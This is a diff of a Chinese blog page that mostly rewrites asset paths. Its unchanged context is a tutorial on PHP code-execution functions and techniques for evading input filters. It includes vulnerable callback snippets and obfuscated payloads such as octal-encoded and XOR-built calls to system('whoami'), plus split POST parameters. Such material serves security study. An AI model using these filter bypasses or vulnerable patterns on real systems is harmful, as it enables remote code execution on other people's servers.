@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/blog.decemberus.com/img/fluid.png">
-  <link rel="icon" href="/blog.decemberus.com/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/decemberus.com/img/fluid.png">
+  <link rel="icon" href="/decemberus.com/img/fluid.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -19,7 +19,7 @@
     <meta name="description" content="php的各种绕过姿势代码执行函数首先来看看在PHP中有哪些函数有代码执行的功能 eval()最常见的代码执行函数，把字符串 code 作为PHP代码执行。 1eval ( string $code ) : mixed    assert()检查一个断言是否为false 12PHP 5assert ( mixed $assertion [, string $description ] ) : boo">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP变量覆盖漏洞">
-<meta property="og:url" content="https://blog.decemberus.com/2022/01/09/%E6%B5%85%E8%B0%88PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%AD%E5%87%BA%E7%8E%B0%E8%BF%87%E6%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:url" content="https://decemberus.com/2022/01/09/%E6%B5%85%E8%B0%88PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%AD%E5%87%BA%E7%8E%B0%E8%BF%87%E6%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95/index.html">
 <meta property="og:site_name" content="欢迎回来">
 <meta property="og:description" content="php的各种绕过姿势代码执行函数首先来看看在PHP中有哪些函数有代码执行的功能 eval()最常见的代码执行函数，把字符串 code 作为PHP代码执行。 1eval ( string $code ) : mixed    assert()检查一个断言是否为false 12PHP 5assert ( mixed $assertion [, string $description ] ) : boo">
 <meta property="og:locale" content="zh_CN">
@@ -82,12 +82,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-<link  rel="stylesheet" href="/blog.decemberus.com/css/main.css" />
+<link  rel="stylesheet" href="/decemberus.com/css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/blog.decemberus.com/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="/decemberus.com/css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/blog.decemberus.com/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="/decemberus.com/css/highlight-dark.css" />
   
 
 
@@ -95,10 +95,10 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"blog.decemberus.com","root":"/blog.decemberus.com/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/blog.decemberus.com/local-search.xml"};
+    var CONFIG = {"hostname":"decemberus.com","root":"/decemberus.com/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/decemberus.com/local-search.xml"};
   </script>
-  <script  src="/blog.decemberus.com/js/utils.js" ></script>
-  <script  src="/blog.decemberus.com/js/color-schema.js" ></script>
+  <script  src="/decemberus.com/js/utils.js" ></script>
+  <script  src="/decemberus.com/js/color-schema.js" ></script>
 
   
 <meta name="generator" content="Hexo 6.1.0"></head>
@@ -113,7 +113,7 @@
 <div class="header-inner" style="height: 70vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/blog.decemberus.com/">
+    <a class="navbar-brand" href="/decemberus.com/">
       <strong>enjoy的blog</strong>
     </a>
 
@@ -132,7 +132,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/blog.decemberus.com/">
+              <a class="nav-link" href="/decemberus.com/">
                 <i class="iconfont icon-home-fill"></i>
                 首页
               </a>
@@ -144,7 +144,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/blog.decemberus.com/archives/">
+              <a class="nav-link" href="/decemberus.com/archives/">
                 <i class="iconfont icon-archive-fill"></i>
                 归档
               </a>
@@ -156,7 +156,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/blog.decemberus.com/categories/">
+              <a class="nav-link" href="/decemberus.com/categories/">
                 <i class="iconfont icon-category-fill"></i>
                 分类
               </a>
@@ -168,7 +168,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/blog.decemberus.com/tags/">
+              <a class="nav-link" href="/decemberus.com/tags/">
                 <i class="iconfont icon-tags-fill"></i>
                 标签
               </a>
@@ -180,7 +180,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/blog.decemberus.com/about/">
+              <a class="nav-link" href="/decemberus.com/about/">
                 <i class="iconfont icon-user-fill"></i>
                 关于
               </a>
@@ -209,7 +209,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/blog.decemberus.com/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('/decemberus.com/img/default.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
@@ -295,29 +295,29 @@
 <h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>最常见的代码执行函数，把<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a> code 作为PHP代码执行。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span> ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="D:/mdimage/image-20230307190834341.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20230307190834341"> </p>
+<p><img src="D:/mdimage/image-20230307190834341.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20230307190834341"> </p>
 <h2 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h2><p>检查一个断言是否为<code>false</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP <span class="hljs-number">5</span><br><span class="hljs-title function_ invoke__">assert</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span> [, <span class="hljs-keyword">string</span> <span class="hljs-variable">$description</span> ] ) : <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP <span class="hljs-number">7</span><br><span class="hljs-title function_ invoke__">assert</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span> [, <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$exception</span> ] ) : <span class="hljs-keyword">bool</span><br><span class="hljs-number">12</span><br></code></pre></td></tr></table></figure>
 
 <p><code>assert()</code>会检查指定的<code>assertion</code>并在结果为<code>false</code>时采取适当的行动。在<code>PHP5</code>或<code>PHP7</code>中，如果<code>assertion</code>是字符串，它将会被<code>assert()</code>当做<code>PHP</code>代码来执行。</p>
-<p><img src="D:/mdimage/image-20230307191009863.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20230307191009863"> 注意版本问题</p>
+<p><img src="D:/mdimage/image-20230307191009863.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20230307191009863"> 注意版本问题</p>
 <h2 id="preg-replace-x2F-e"><a href="#preg-replace-x2F-e" class="headerlink" title="preg_replace()+&#x2F;e"></a>preg_replace()+&#x2F;e</h2><p>执行一个正则表达式的搜索和替换</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure>
 
 <p>搜索<code>subject</code>中匹配<code>pattern</code>的部分，以<code>replacement</code>进行替换。如果<code>pattern</code>的模式修饰符使用<code>/e</code>，那么当<code>subject</code>被匹配成功时，<code>replacement</code>会被当做PHP代码执行</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS： preg_replace()+函数的/e修饰符在PHP7中被移除<br></code></pre></td></tr></table></figure>
 
-<p><img src="D:\mdimage\image-20220927205346256.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220927205346256"> </p>
-<p><img src="D:/mdimage/image-20230307191803389.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20230307191803389">&#x2F;e 它表示将模式字符串解释为 PHP 代码并执行它，然后将执行结果作为替换字符串</p>
+<p><img src="D:\mdimage\image-20220927205346256.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220927205346256"> </p>
+<p><img src="D:/mdimage/image-20230307191803389.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20230307191803389">&#x2F;e 它表示将模式字符串解释为 PHP 代码并执行它，然后将执行结果作为替换字符串</p>
 <h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h2><p>创建一个匿名（lambda样式）函数</p>
 <figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">create_function ( <span class="hljs-built_in">string</span> $args , <span class="hljs-built_in">string</span> $code ) : <span class="hljs-built_in">string</span><br></code></pre></td></tr></table></figure>
 
 
 <p>根据传递的参数创建一个匿名函数，并为其返回唯一的名称。如果没有严格对参数传递进行过滤，攻击者可以构造payload传递给create_function()对参数或函数体闭合注入恶意代码导致代码执行</p>
-<p><img src="D:/mdimage/image-20220928183339905.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928183339905"> </p>
-<p><img src="D:/mdimage/image-20220928183345893.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928183345893"> </p>
+<p><img src="D:/mdimage/image-20220928183339905.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928183339905"> </p>
+<p><img src="D:/mdimage/image-20220928183345893.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928183345893"> </p>
 <h1 id="可回调函数"><a href="#可回调函数" class="headerlink" title="可回调函数"></a>可回调函数</h1><p>从前有座山。。。</p>
 <p>在这里</p>
 <h2 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h2><p>为数组的每个元素应用回调函数</p>
@@ -330,22 +330,22 @@
 <p>利用代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-variable">$array</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;arg&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$array</span>);<br></code></pre></td></tr></table></figure>
 
-<p><img src="D:/mdimage/image-20220928184209095.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928184209095"> </p>
+<p><img src="D:/mdimage/image-20220928184209095.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928184209095"> </p>
 <h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p>把第一个参数作为回调函数调用</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span> ( <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span> [, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$parameter</span> [, <span class="hljs-keyword">mixed</span> $... ]] ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure>
 
 <p>第一个参数<code>callback</code>是被调用的回调函数，其余参数是回调函数的参数。</p>
-<p><img src="D:/mdimage/image-20220928184819744.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928184819744"> </p>
+<p><img src="D:/mdimage/image-20220928184819744.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928184819744"> </p>
 <h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h2><p>调用回调函数，并把一个数组参数作为回调函数的参数</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">call_user_func_array ( callable <span class="hljs-variable">$callback</span> , array <span class="hljs-variable">$param_arr</span> ) : mixed<br></code></pre></td></tr></table></figure>
 
 <p>把第一个参数作为回调函数<code>callback</code>调用，把参数数组作<code>param_arr</code>为回调函数的的参数传入。跟<code>array_map()</code>相似</p>
-<p><img src="D:/mdimage/image-20220928184904851.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928184904851"> </p>
+<p><img src="D:/mdimage/image-20220928184904851.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928184904851"> </p>
 <h2 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h2><p>用回调函数过滤数组中的单元</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">array_filter ( array <span class="hljs-variable">$array</span> [, callable <span class="hljs-variable">$callback</span> [, int <span class="hljs-variable">$flag</span> = 0 ]] ) : array<br></code></pre></td></tr></table></figure>
 
 <p>依次将<code>array</code>数组中的每个值传递到<code>callback</code>函数。如果<code>callback</code>函数返回<code>true</code>，则<code>array</code>数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p>
-<p><img src="D:/mdimage/image-20220928185052033.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928185052033"> </p>
+<p><img src="D:/mdimage/image-20220928185052033.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928185052033"> </p>
 <h2 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h2><p>使用用户自定义的比较函数对数组中的值进行排序</p>
 <figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">usort (<span class="hljs-built_in"> array </span>&amp;$array , callable $value_compare_func )<span class="hljs-keyword"> :</span> bool<br></code></pre></td></tr></table></figure>
 
@@ -353,7 +353,7 @@
 <p>漏洞如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-variable">$array</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;array&#x27;</span>];<br><span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$array</span>,<span class="hljs-variable">$func</span>);<br></code></pre></td></tr></table></figure>
 
-<p><img src="D:/mdimage/image-20230307194241008.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20230307194241008">  </p>
+<p><img src="D:/mdimage/image-20230307194241008.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20230307194241008">  </p>
 <h2 id="php可变长参数"><a href="#php可变长参数" class="headerlink" title="php可变长参数"></a>php可变长参数</h2><p>当<code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>时，php有一个<code>参数变长</code>特性</p>
 <p>PHP支持可变长参数函数。这让我们可以在函数中传递<code>0</code>，<code>1</code>,<code>...</code>或<code>n</code>个参数。 为此，您需要在参数名称前使用<code>3</code>个省略号(点)。</p>
 <p><code>3</code>点(<code>...</code>)概念是从<strong>PHP 5.6</strong>开始实现的可变长参数。下面来看看一个简单的例子PHP变长参数函数。</p>
@@ -363,12 +363,12 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">10<br></code></pre></td></tr></table></figure>
 
 <p>然后我们就可以就和上面的usort语句进行应用啦</p>
-<p><img src="D:/mdimage/image-20220928190332226.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928190332226"> </p>
+<p><img src="D:/mdimage/image-20220928190332226.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928190332226"> </p>
 <h1 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h1><blockquote>
 <p>字符串拼接绕过适用于绕过过滤具体关键字的限制</p>
 <p>使用版本：PHP&gt;7</p>
 </blockquote>
-<p><img src="D:/mdimage/image-20220928190439600.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928190439600"> &#x2F;i是大小写绕过</p>
+<p><img src="D:/mdimage/image-20220928190439600.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928190439600"> &#x2F;i是大小写绕过</p>
 <p>可以按照下面这个方法进行构造</p>
 <figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(p.h.p.i.n.f.o)</span><span class="hljs-comment">()</span>;<br><span class="hljs-comment">(sy.(st)</span>.em)<span class="hljs-comment">(whoami)</span>;<br><span class="hljs-comment">(sy.(st)</span>.em)<span class="hljs-comment">(who.ami)</span>;<br><span class="hljs-comment">(s.y.s.t.e.m)</span><span class="hljs-comment">(&quot;whoami&quot;)</span>;<br>.......<br></code></pre></td></tr></table></figure>
 
@@ -382,16 +382,16 @@
 </blockquote>
 <p><strong>注意，注意这里转义后的字符必须双引号包裹传参</strong></p>
 <p>以八进制表示的<code>\[0–7]&#123;1,3&#125;</code>转义字符会自动适配byte（如<code>&quot;\400&quot; == “\000”</code>）<br>以十六进制的<code>\x[0–9A-Fa-f]&#123;1,2&#125;</code>转义字符表示法（如<code>“\x41&quot;</code>）<br>以Unicode表示的<code>\u&#123;[0–9A-Fa-f]+&#125;</code>字符，会输出为UTF-8字符串</p>
-<p><img src="D:/mdimage/image-20220928191353537.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928191353537"> </p>
+<p><img src="D:/mdimage/image-20220928191353537.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928191353537"> </p>
 <p>另外，八进制的方法可以绕过<code>无字母传参</code>进行代码执行</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;\163\171\163\164\145\155&quot;</span>(<span class="hljs-string">&quot;\167\150\157\141\155\151&quot;</span>);<span class="hljs-comment">#system(&#x27;whoami&#x27;);</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="D:/mdimage/image-20220928191455864.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928191455864"> </p>
+<p><img src="D:/mdimage/image-20220928191455864.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928191455864"> </p>
 <h1 id="多次传参绕过"><a href="#多次传参绕过" class="headerlink" title="多次传参绕过"></a>多次传参绕过</h1><blockquote>
 <p>适用PHP版本：<code>无限制</code></p>
 </blockquote>
 <p>如果过滤了<code>引号(单引号/双引号)</code>，可以通过以下方法绕过</p>
-<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p><img src="D:/mdimage/image-20220928191712923.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928191712923"> </p>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p><img src="D:/mdimage/image-20220928191712923.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928191712923"> </p>
 <p>先post参数</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-number">2</span>])<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
 
@@ -400,27 +400,27 @@
 
 
 
-<p><img src="D:/mdimage/image-20220928192306238.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928192306238"> </p>
+<p><img src="D:/mdimage/image-20220928192306238.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928192306238"> </p>
 <p>这里需要注意，用get传参数的时候千万别用hackerbar，否则会对url编两次码</p>
 <h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>也可以传入POST参数一步到位</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-number">2</span>])<span class="hljs-comment">;&amp;1=system&amp;2=whoami</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="D:/mdimage/image-20220928194334185.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928194334185"> </p>
+<p><img src="D:/mdimage/image-20220928194334185.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928194334185"> </p>
 <h2 id="绕过过滤引号"><a href="#绕过过滤引号" class="headerlink" title="绕过过滤引号"></a>绕过过滤引号</h2><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">(<span class="hljs-name">sy.st.em</span>)(<span class="hljs-name">whoami</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
 
 <h2 id="绕过参数长度限制"><a href="#绕过参数长度限制" class="headerlink" title="绕过参数长度限制"></a>绕过参数长度限制</h2><p>另外如果碰到参数长度受限制，也可以通过多次传参的方法绕过参数长度限制或者回调函数</p>
-<h3 id="多次传参"><a href="#多次传参" class="headerlink" title="多次传参"></a>多次传参</h3><p><img src="D:/mdimage/image-20220928194625171.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928194625171"> </p>
-<h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p><img src="D:/mdimage/image-20220928194645157.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928194645157"> </p>
+<h3 id="多次传参"><a href="#多次传参" class="headerlink" title="多次传参"></a>多次传参</h3><p><img src="D:/mdimage/image-20220928194625171.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928194625171"> </p>
+<h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p><img src="D:/mdimage/image-20220928194645157.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928194645157"> </p>
 <p>再次重复一下之前的可变参数操作是要求php版本&gt;5.6且&lt;7</p>
 <h1 id="内置函数访问绕过"><a href="#内置函数访问绕过" class="headerlink" title="内置函数访问绕过"></a>内置函数访问绕过</h1><p>适用于PHP版本：Windows本地测试的是<code>PHP&gt;=7</code>可以成功，<code>PHP5</code>测试虽然报错但是并不肯定不能使用</p>
 <p>这个可以对比ssti学习</p>
 <p>利用这种方法首先还需要知道PHP的具体版本，因为每个版本的<code>get_defined_functions()</code>返回的值都是不一样的，这里以<code>php7.4.3</code>为准</p>
-<p><img src="D:/mdimage/image-20220928201350557.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928201350557"> </p>
+<p><img src="D:/mdimage/image-20220928201350557.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928201350557"> </p>
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">php -r <span class="hljs-string">&quot;print_r(get_defined_functions());&quot;</span> <span class="hljs-string">|findstr /S &quot;</span>phpinfo<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="D:/mdimage/image-20220928200928521.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928200928521"> </p>
+<p><img src="D:/mdimage/image-20220928200928521.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928200928521"> </p>
 <p>上面图里的266其实就是我主机上面的600，也就是phpinfo</p>
-<p><img src="D:/mdimage/image-20220928201540021.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="image-20220928201540021"> </p>
+<p><img src="D:/mdimage/image-20220928201540021.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="image-20220928201540021"> </p>
 <p>358就是system</p>
 <h1 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h1><p>适用PHP版本：<code>无限制</code></p>
 <p>这一点和sql注入里面的异或注入并非一个意思</p>
@@ -431,7 +431,7 @@
 </blockquote>
 <p>而在这里事情就变得不同了</p>
 <h2 id="当过滤字符较多时（无参数RCE）"><a href="#当过滤字符较多时（无参数RCE）" class="headerlink" title="当过滤字符较多时（无参数RCE）"></a>当过滤字符较多时（无参数RCE）</h2><h3 id="方法一（利用位运算符）"><a href="#方法一（利用位运算符）" class="headerlink" title="方法一（利用位运算符）"></a>方法一（利用位运算符）</h3><p>在PHP中两个字符串异或之后，得到的还是一个字符串。<br>例如：我们异或 <code>?</code> 和 <code>~</code> 之后得到的是 <code>A</code></p>
-<p><img src="D:/mdimage/20200304105440370.png" srcset="/blog.decemberus.com/img/loading.gif" lazyload alt="图一"> </p>
+<p><img src="D:/mdimage/20200304105440370.png" srcset="/decemberus.com/img/loading.gif" lazyload alt="图一"> </p>
 <figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">字符：?         ASCII码：63           二进制：  00‭11 1111‬<br>字符：~         ASCII码：126          二进制： <span class="hljs-number"> 0111 </span>1110‬<br>异或规则：<br>1   XOR  <span class="hljs-number"> 0 </span>  =   1<br>0   XOR  <span class="hljs-number"> 1 </span>  =   1<br>0   XOR  <span class="hljs-number"> 0 </span>  =   0<br>1   XOR  <span class="hljs-number"> 1 </span>  =   0<br>上述两个字符异或得到 二进制： <span class="hljs-number"> 0100 </span>0001<br>该二进制的十进制也就是：65<br>对应的ASCII码是：A<br></code></pre></td></tr></table></figure>
 
 <p>接下来看一道例题：</p>
@@ -470,7 +470,7 @@
